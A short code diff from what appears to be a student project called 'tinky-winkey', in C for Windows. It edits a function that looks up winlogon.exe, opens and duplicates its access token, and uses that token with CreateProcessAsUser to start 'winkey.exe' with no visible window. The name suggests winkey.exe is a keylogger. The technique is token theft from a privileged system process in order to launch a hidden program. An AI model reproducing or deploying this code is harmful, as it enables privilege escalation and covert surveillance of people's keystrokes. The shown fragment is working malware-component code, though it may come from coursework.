@@ -38,11 +38,12 @@ void    Tinky_Winky() {
 	DWORD winlogonPID;
 	HANDLE wlPH;
 	HANDLE wlTH;
-	LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
+	char* deb = "C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
+	LPCSTR PP = deb;
 	STARTUPINFO Si;
 
-	//ZeroMemory(&Si, sizeof(Si));
-	//Si.cb = sizeof(Si);
+	ZeroMemory(&Si, sizeof(Si));
+	Si.cb = sizeof(Si);
 	winlogonPID = GetPidByName("winlogon.exe");
 	wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
 	if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
@@ -60,7 +61,7 @@ void    Tinky_Winky() {
 	/*if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
 		printf("cpwt (%ld)\n", GetLastError());
 	}*/
-	if (!CreateProcessAsUserW(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOW)&Si, &winkeyPI)) {
+	if (!CreateProcessAsUser(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &Si, &winkeyPI)) {
 		printf("cpwt (%ld)\n", GetLastError());
 	}
 }
